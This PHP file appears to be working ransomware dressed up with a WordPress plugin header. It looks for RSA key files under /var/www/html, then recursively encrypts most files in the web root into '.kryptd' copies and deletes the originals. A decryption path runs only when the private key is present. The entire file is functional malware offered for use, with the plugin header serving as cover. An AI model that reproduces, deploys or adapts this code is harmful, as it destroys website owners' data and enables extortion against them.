<?php

/**
 * Plugin Name: KRYPT3R.K4NC3R
 * Plugin URI: 
 * Description: amuse yo'self.
 * Version: 0.8.0
 * Author: 0xdecae
 * Author URI:
 * */

//error_reporting(0);

$tears = true;
$chunksize = 0;
$pubkeypath = '';
$privkeypath = '';

extsearch('/var/www/html', 'key', $pubkeypath, $privkeypath);

echo getcwd();
if (!$pkey = openssl_pkey_get_private('file://'.$privkeypath))
{
	if(!$pkey = openssl_pkey_get_public('file://'.$pubkeypath))
	{
		die("Failed to locate key. Exiting...");
	}
	$a_key = openssl_pkey_get_details($pkey);
	$chunksize = ceil($a_key['bits'] / 8) - 11;

}
else
{
	$tears = false;
	$a_key = openssl_pkey_get_details($pkey);
	$chunksize = ceil($a_key['bits'] / 8);

}

chdir('/var/www/html');

function victimize($dir, $key, $csize, $cry)
{
	$files = array_diff(scandir($dir), array('.', '..'));

	foreach($files as $file) 
	{
		$path = $dir."/".$file;
		//echo $path."\n"; 
		if(is_dir($path))
		{
			//echo $path." is dir, further sinking...\n";
			victimize($path, $key, $csize, $cry);	

		}
		else if ($path != __FILE__ 
			and pathinfo($file)['extension'] != "key" 
			and pathinfo($file)['extension'] != "htaccess"
			and pathinfo($file)['extension'] != "jpeg"
			and pathinfo($file)['extension'] != "kryptd"
			and pathinfo($file)['extension'] != "png"		
			and pathinfo($file)['extension'] != "Index.php"
			and pathinfo($file)['extension'] != "index.php"
			and pathinfo($file)['extension'] != "php"
			and $cry == true
		) 
		{		
			echo $path." is a file, krypting...\n";
			echo krypt($path, $key, $csize);	
		}
		else if (pathinfo($file)['extension'] == "kryptd" and $cry == false)
		{
			echo $path." is an encrypted file, dekrypting...\n";
			echo dkrypt($path, $key, $csize);
		}

	}
}

function extsearch($dir, $ext, &$pub, &$priv)
{
	$files = array_diff(scandir($dir), array('.', '..'));

	foreach($files as $file) 
	{
		$path = $dir."/".$file;
		//echo $path."\n"; 
		if(is_dir($path))
		{
			//echo $path." is dir, further sinking...\n";
			extsearch($path, $ext, $pub, $priv);	

		} 
		else if (pathinfo($file)['extension'] == $ext) 
		{
			//echo $path." : skipping host script or .key\n";
			if (pathinfo($file)['filename'] == 'public')
			{
				//echo "Public Key Found!\n";
				$pub = $path;
			}
			else if (pathinfo($file)['filename'] == 'private')
			{
				//echo "Private key found!\n";
				$priv = $path;
			}
			else
			{
				//echo "Wrong key, Holmes...\n";
			}
		}
	}
}
function dkrypt($f, $key, $size)
{	
	$ciphertext = file_get_contents($f);
	//echo "Ciphertext for " . $f . ":\n " . $ciphertext . "\n\n";

	$dest = substr($f, 0, -7);
	//echo "Destination file: " . $dest;
	$out = '';

	while($ciphertext)
	{
		$chunk = substr($ciphertext, 0, $size);
		$ciphertext = substr($ciphertext, $size);
		$dkryptd = '';

		if (!openssl_private_decrypt($chunk, $dkryptd, $key))
		{
			return 'Failed to dekrypt data...';
		}
		
		$out .= $dkryptd;
	}
	$out = gzuncompress($out);
	file_put_contents($dest, $out);
	unlink($f);
}

function krypt($f, $key, $size)
{	
	$data = file_get_contents($f);
	//echo "Plaintext for " . $f . " before compression:\n " . $data . "\n\n";
	$plaintext = gzcompress($data);
	//echo "Plaintext for " . $f . " after compression:\n " . $plaintext . "\n\n";

	$dest = $f . '.kryptd';
	//echo "Destination file: " . $dest;
	$out = '';

	while($plaintext)
	{
		$chunk = substr($plaintext, 0, $size);
		$plaintext = substr($plaintext, $size);
		$kryptd = '';

		if (!openssl_public_encrypt($chunk, $kryptd, $key))
		{
			return 'Failed to encrypt data...';
		}
		
		$out .= $kryptd;
	}
	//echo 'Output: ' . $out;
	file_put_contents($dest, $out);
	unlink($f);
	return "Krypt of ".$f." successful!\n";
}

victimize(getcwd(), $pkey, $chunksize, $tears);
openssl_free_key($pkey);
?>

